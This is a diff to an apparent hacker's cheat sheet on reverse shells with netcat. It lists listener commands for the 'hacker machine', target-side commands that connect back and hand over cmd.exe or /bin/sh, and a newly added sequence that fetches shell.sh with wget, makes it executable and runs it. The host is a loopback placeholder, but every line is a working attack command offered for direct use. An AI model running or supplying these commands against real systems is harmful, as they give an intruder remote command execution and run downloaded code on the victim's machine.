@@ -3,14 +3,19 @@
 # redirect process stdin and stdout via netcat
 
 # in the hacker machine
-# create a socket server and listing connection
+# create a socket server and listing for reverse shell connection
 # from the target machine via port 1609
 nc -lnvp 1609
 ncat -lnvp 1609
 
 # in the target machine
-# inbound program `cmd.exe` to execute to making a shell
+# inbound program `cmd` or `sh` to execute to making a shell
 # and connect to the hacker's machine via port 1609
 # then waiting for hacker's command to execute
 nc 127.0.0.1 1609 -e cmd.exe
-ncat 127.0.0.1 1609 -c /bin/sh # not working
+ncat 127.0.0.1 1609 -c /bin/sh
+
+# download and run in the target machine
+wget http://127.0.0.1:8080/shell.sh
+chmod +x shell.sh
+./shell.sh
